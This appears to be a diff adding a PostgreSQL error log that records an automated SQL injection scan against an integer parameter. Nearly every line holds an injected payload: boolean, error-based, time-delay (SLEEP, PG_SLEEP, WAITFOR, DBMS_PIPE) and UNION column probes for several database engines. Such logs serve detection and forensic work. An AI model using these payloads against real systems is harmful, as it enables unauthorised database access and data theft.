@@ -1,0 +1,328 @@
+|2016-10-06 19:23:25[ invalid input syntax for integer: "1.)'",,",()" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1'ccCw<'">ncDd" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1) AND 1483=2060 AND (1268=1268" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1) AND 4434=4434 AND (9691=9691" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1 AND 4720=9906" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1 AND 4434=4434" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1') AND 5315=4604 AND ('NjDk'='NjDk" at character 535
+|2016-10-06 19:23:26[ invalid input syntax for integer: "1') AND 4434=4434 AND ('lpwK'='lpwK" at character 535
+|2016-10-06 19:23:27[ invalid input syntax for integer: "1' AND 7442=8375 AND 'wPoo'='wPoo" at character 535
+|2016-10-06 19:23:27[ invalid input syntax for integer: "1' AND 4434=4434 AND 'WKhC'='WKhC" at character 535
+|2016-10-06 19:23:27[ invalid input syntax for integer: "1%' AND 6597=5708 AND '%'='" at character 535
+|2016-10-06 19:23:27[ invalid input syntax for integer: "1%' AND 4434=4434 AND '%'='" at character 535
+|2016-10-06 19:23:27[ invalid input syntax for integer: "1 AND 1149=1412-- yXQp" at character 535
+|2016-10-06 19:23:27[ invalid input syntax for integer: "1 AND 4434=4434-- Dsol" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1) AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(5516=5516,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (7256=7256" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1 AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(5516=5516,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1') AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(5516=5516,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('zOSP'='zOSP" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1' AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(5516=5516,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'XRDy'='XRDy" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1%' AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(5516=5516,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1 AND (SELECT 5516 FROM(SELECT COUNT(*),CONCAT(0x7170716b71,(SELECT (ELT(5516=5516,1))),0x716a7a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- rwUz" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1) AND 2075=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2075=2075) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC) AND (5941=5941" at character 535
+|2016-10-06 19:23:28[ invalid input syntax for integer: "1 AND 2075=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2075=2075) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC)" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1') AND 2075=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2075=2075) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC) AND ('JJWT'='JJWT" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1' AND 2075=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2075=2075) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC) AND 'dHLg'='dHLg" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1%' AND 2075=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2075=2075) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC) AND '%'='" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1 AND 2075=CAST((CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (2075=2075) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)) AS NUMERIC)-- UbSI" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1) AND 7889=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7889=7889) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))) AND (3603=3603" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1 AND 7889=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7889=7889) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113)))" at character 535
+|2016-10-06 19:23:29[ invalid input syntax for integer: "1') AND 7889=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7889=7889) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))) AND ('VrWo'='VrWo" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1' AND 7889=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7889=7889) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))) AND 'RHoQ'='RHoQ" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1%' AND 7889=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7889=7889) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113))) AND '%'='" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1 AND 7889=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (7889=7889) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(122)+CHAR(113)+CHAR(113)))-- eWQh" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1) AND 1154=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (1154=1154) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND (7876=7876" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1 AND 1154=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (1154=1154) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1') AND 1154=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (1154=1154) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND ('Gbui'='Gbui" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1' AND 1154=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (1154=1154) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND 'Bdkn'='Bdkn" at character 535
+|2016-10-06 19:23:30[ invalid input syntax for integer: "1%' AND 1154=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (1154=1154) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='" at character 535
+|2016-10-06 19:23:31[ invalid input syntax for integer: "1 AND 1154=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(112)||CHR(113)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (1154=1154) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(122)||CHR(113)||CHR(113)||CHR(62))) FROM DUAL)-- PBhh" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1);(SELECT * FROM (SELECT(SLEEP(5)))VYNP)#" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1;(SELECT * FROM (SELECT(SLEEP(5)))VYNP)#" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1');(SELECT * FROM (SELECT(SLEEP(5)))VYNP)#" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1';(SELECT * FROM (SELECT(SLEEP(5)))VYNP)#" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1%';(SELECT * FROM (SELECT(SLEEP(5)))VYNP)#" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1);SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1;SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:23:32[ invalid input syntax for integer: "1');SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1';SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1%';SELECT PG_SLEEP(5)--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1);WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1;WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1');WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1';WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1%';WAITFOR DELAY '0:0:5'--" at character 535
+|2016-10-06 19:23:33[ invalid input syntax for integer: "1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(80)||CHR(99),5) FROM DUAL--" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(80)||CHR(99),5) FROM DUAL--" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1');SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(80)||CHR(99),5) FROM DUAL--" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(80)||CHR(99),5) FROM DUAL--" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(78)||CHR(80)||CHR(99),5) FROM DUAL--" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1) AND (SELECT * FROM (SELECT(SLEEP(5)))KqWW) AND (8121=8121" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))KqWW)" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1') AND (SELECT * FROM (SELECT(SLEEP(5)))KqWW) AND ('kVkP'='kVkP" at character 535
+|2016-10-06 19:23:34[ invalid input syntax for integer: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))KqWW) AND 'RStc'='RStc" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1%' AND (SELECT * FROM (SELECT(SLEEP(5)))KqWW) AND '%'='" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))KqWW)-- EEmx" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1) AND 2431=(SELECT 2431 FROM PG_SLEEP(5)) AND (2855=2855" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1 AND 2431=(SELECT 2431 FROM PG_SLEEP(5))" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1') AND 2431=(SELECT 2431 FROM PG_SLEEP(5)) AND ('SSPK'='SSPK" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1' AND 2431=(SELECT 2431 FROM PG_SLEEP(5)) AND 'VqPT'='VqPT" at character 535
+|2016-10-06 19:23:35[ invalid input syntax for integer: "1%' AND 2431=(SELECT 2431 FROM PG_SLEEP(5)) AND '%'='" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1 AND 2431=(SELECT 2431 FROM PG_SLEEP(5))-- GIMi" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1) WAITFOR DELAY '0:0:5' AND (2397=2397" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1 WAITFOR DELAY '0:0:5'" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1') WAITFOR DELAY '0:0:5' AND ('rSka'='rSka" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1' WAITFOR DELAY '0:0:5' AND 'pMvo'='pMvo" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1%' WAITFOR DELAY '0:0:5' AND '%'='" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1 WAITFOR DELAY '0:0:5'-- mgqq" at character 535
+|2016-10-06 19:23:36[ invalid input syntax for integer: "1) AND 9223=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(98)||CHR(80)||CHR(108),5) AND (3555=3555" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1 AND 9223=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(98)||CHR(80)||CHR(108),5)" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1') AND 9223=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(98)||CHR(80)||CHR(108),5) AND ('zjRX'='zjRX" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1' AND 9223=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(98)||CHR(80)||CHR(108),5) AND 'tFXk'='tFXk" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1%' AND 9223=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(98)||CHR(80)||CHR(108),5) AND '%'='" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1 AND 9223=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(98)||CHR(80)||CHR(108),5)-- QaIK" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1) ORDER BY 1-- -" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1) UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:23:37[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:38[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,'qpqkq'||'LEBhBthguxhfHmSZsXIUSFBNaZnVzJCBbQPuzlqF'||'qjzqq'-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT 'qpqkq'||'sutVJqUCUDWvYULuBKRcjzgQtmbsatrdojtuSyFf'||'qjzqq',NULL,NULL-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,'qpqkq'||'wqeYpKnItFfiIlNJVQAWqUJbstWSxKAwFpjTJMIU'||'qjzqq',NULL-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,NULL,'qpqkq'||'HOJTBrOrWD'||'qjzqq'-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT 'qpqkq'||'iNaVpiYGcC'||'qjzqq',NULL,NULL-- -" at character 535
+|2016-10-06 19:23:39[ invalid input syntax for integer: "1) UNION ALL SELECT NULL,'qpqkq'||'adjiFpVwnN'||'qjzqq',NULL-- -" at character 535
+|2016-10-06 19:24:22[ invalid input syntax for integer: "1) UNION ALL SELECT 93,93,'qpqkq'||'dOAcVBdRUUWBVkJxAZxxyXKCZPIkCzGfUleiyYeG'||'qjzqq'-- -" at character 535
+|2016-10-06 19:24:23[ invalid input syntax for integer: "1) UNION ALL SELECT 'qpqkq'||'ITHBpwDKiYasPlenjnhZMCZgLPFFajGpEaKZBTSa'||'qjzqq',93,93-- -" at character 535
+|2016-10-06 19:24:23[ invalid input syntax for integer: "1) UNION ALL SELECT 93,'qpqkq'||'LguQtMIJpEOYwZAxdykqdcwTrkJSrYOIhonEworl'||'qjzqq',93-- -" at character 535
+|2016-10-06 19:24:23[ invalid input syntax for integer: "1) UNION ALL SELECT 93,93,'qpqkq'||'SaWfzcChGQ'||'qjzqq'-- -" at character 535
+|2016-10-06 19:24:23[ invalid input syntax for integer: "1) UNION ALL SELECT 'qpqkq'||'ptnJEZBUGj'||'qjzqq',93,93-- -" at character 535
+|2016-10-06 19:24:23[ invalid input syntax for integer: "1) UNION ALL SELECT 93,'qpqkq'||'WaATcdiZyq'||'qjzqq',93-- -" at character 535
+|2016-10-06 19:24:24[ invalid input syntax for integer: "1 ORDER BY 1-- -" at character 535
+|2016-10-06 19:24:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:24:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:24:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:24[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1') ORDER BY 1-- -" at character 535
+|2016-10-06 19:24:25[ invalid input syntax for integer: "1') UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:26[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' ORDER BY 1-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:27[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1%' ORDER BY 1-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:24:28[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:29[ invalid input syntax for integer: "1 ORDER BY 1-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:30[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:31[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:31[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -" at character 535
+|2016-10-06 19:24:31[ invalid input syntax for integer: "1 UNION ALL SELECT 'qpqkq'||'QHRPSHxcQBZNgLKOZqUuLVGxGdqoOSwnmvNipJnp'||'qjzqq',NULL-- -" at character 535
+|2016-10-06 19:24:31[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,'qpqkq'||'PySTcjbOwATVBREfKGGwYtZHQUEsHHVRxtiGURKH'||'qjzqq'-- -" at character 535
+|2016-10-06 19:24:31[ invalid input syntax for integer: "1 UNION ALL SELECT 'qpqkq'||'wQNnzLHOuG'||'qjzqq',NULL-- -" at character 535
+|2016-10-06 19:24:31[ invalid input syntax for integer: "1 UNION ALL SELECT NULL,'qpqkq'||'GHGdkKSInZ'||'qjzqq'-- -" at character 535
+|2016-10-06 19:25:10[ invalid input syntax for integer: "1,(.))."'(," at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1'sAyu<'">wwqO" at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1) AND 1012=1234 AND (5851=5851" at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1) AND 8688=8688 AND (7261=7261" at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1 AND 4726=5309" at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1 AND 8688=8688" at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1') AND 7949=5482 AND ('NcZs'='NcZs" at character 535
+|2016-10-06 19:25:11[ invalid input syntax for integer: "1') AND 8688=8688 AND ('MUgP'='MUgP" at character 535
+|2016-10-06 19:25:12[ invalid input syntax for integer: "1' AND 4663=1985 AND 'xCED'='xCED" at character 535
+|2016-10-06 19:25:12[ invalid input syntax for integer: "1' AND 8688=8688 AND 'NAxD'='NAxD" at character 535
+|2016-10-06 19:25:12[ invalid input syntax for integer: "1%' AND 7078=3714 AND '%'='" at character 535
